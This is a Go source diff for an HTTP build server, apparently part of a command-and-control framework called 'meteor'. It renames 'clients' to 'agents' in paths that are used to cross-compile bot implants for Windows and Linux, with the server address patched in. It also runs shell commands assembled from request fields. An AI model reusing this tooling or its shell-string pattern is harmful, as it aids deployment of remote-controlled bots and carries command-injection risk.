@@ -13,8 +13,8 @@ import (
 	"time"
 )
 
-// ValidClients is a ist of bot clients that have src code written (note: commander clients are not valid, only actual "bots")
-var ValidClients = []string{"cera", "petrie", "little_foot"}
+// ValidAgents is a ist of bot agents that have src code written (note: commander agents are not valid, only actual "bots")
+var ValidAgents = []string{"cera", "petrie", "little_foot"}
 
 // BuildReq is the struct that holds the required fields for requesting a new client build
 type BuildReq struct {
@@ -45,7 +45,7 @@ func status(w http.ResponseWriter, r *http.Request) {
 
 func buildDT() {
 	newEnv := "export GOOS=windows"
-	compileCom := newEnv + "; cd /go/src/github.com/degenerat3/meteor/meteor/clients/daddy_tops; go get ./...; go build -o outBin.exe; cp outBin.exe /hostedfiles/dt/win_dt.exe;"
+	compileCom := newEnv + "; cd /go/src/github.com/degenerat3/meteor/meteor/client/daddy_tops; go get ./...; go build -o outBin.exe; cp outBin.exe /hostedfiles/dt/win_dt.exe;"
 	c := exec.Command("/bin/sh", "-c", compileCom)
 	err := c.Run()
 	if err != nil {
@@ -53,7 +53,7 @@ func buildDT() {
 		panic(err)
 	}
 	newEnv = "export GOOS=linux"
-	compileCom = newEnv + "; cd /go/src/github.com/degenerat3/meteor/meteor/clients/daddy_tops; go build -o outBin.bin; cp outBin.bin /hostedfiles/dt/nix_dt.bin;"
+	compileCom = newEnv + "; cd /go/src/github.com/degenerat3/meteor/meteor/client/daddy_tops; go build -o outBin.bin; cp outBin.bin /hostedfiles/dt/nix_dt.bin;"
 	c = exec.Command("/bin/sh", "-c", compileCom)
 	err = c.Run()
 	if err != nil {
@@ -85,14 +85,14 @@ func handleBuildReq(w http.ResponseWriter, r *http.Request) {
 
 func buildClient(br BuildReq) (int, string) {
 	newID := genRando()
-	validCli := stringInSlice(br.ClientName, ValidClients)
+	validCli := stringInSlice(br.ClientName, ValidAgents)
 	if validCli == false {
 		return 400, "400 - Invalid client name: '" + br.ClientName + "'"
 	}
 	if br.TargetOS != "windows" && br.TargetOS != "linux" {
 		return 400, "400 - Invalid TargetOS: '" + br.TargetOS + "' . Must be: 'linux' or 'windows'."
 	}
-	cpCom := "cp -r /go/src/github.com/degenerat3/meteor/meteor/clients/" + br.ClientName + " /go/src/github.com/degenerat3/meteor/meteor/clients/" + newID
+	cpCom := "cp -r /go/src/github.com/degenerat3/meteor/meteor/agents/" + br.ClientName + " /go/src/github.com/degenerat3/meteor/meteor/agents/" + newID
 	c := exec.Command("/bin/sh", "-c", cpCom)
 	err := c.Run()
 	if err != nil {
@@ -100,13 +100,13 @@ func buildClient(br BuildReq) (int, string) {
 	}
 	replaceAttributes(br, newID)
 	newEnv := "export GOOS=" + br.TargetOS
-	compileCom := newEnv + "; cd /go/src/github.com/degenerat3/meteor/meteor/clients/" + newID + "; go build -o outBin; cp outBin /hostedfiles/" + newID + ";"
+	compileCom := newEnv + "; cd /go/src/github.com/degenerat3/meteor/meteor/agents/" + newID + "; go build -o outBin; cp outBin /hostedfiles/" + newID + ";"
 	c = exec.Command("/bin/sh", "-c", compileCom)
 	err = c.Run()
 	if err != nil {
 		return 500, "500 - error compiling new files"
 	}
-	cleanUpCom := "rm -rf /go/src/github.com/degenerat3/meteor/meteor/clients/" + newID
+	cleanUpCom := "rm -rf /go/src/github.com/degenerat3/meteor/meteor/agents/" + newID
 	c = exec.Command("/bin/sh", "-c", cleanUpCom)
 	err = c.Run()
 	if err != nil {
@@ -138,7 +138,7 @@ func stringInSlice(a string, list []string) bool {
 }
 
 func replaceAttributes(br BuildReq, newID string) {
-	path := "/go/src/github.com/degenerat3/meteor/meteor/clients/" + newID + "/" + br.ClientName + ".go"
+	path := "/go/src/github.com/degenerat3/meteor/meteor/agents/" + newID + "/" + br.ClientName + ".go"
 	read, _ := ioutil.ReadFile(path)
 	newContents := strings.Replace(string(read), "$$SERVER$$", br.Server, 1)
 	newContents = strings.Replace(string(newContents), "$$REGFILE$$", br.RegFile, 1)
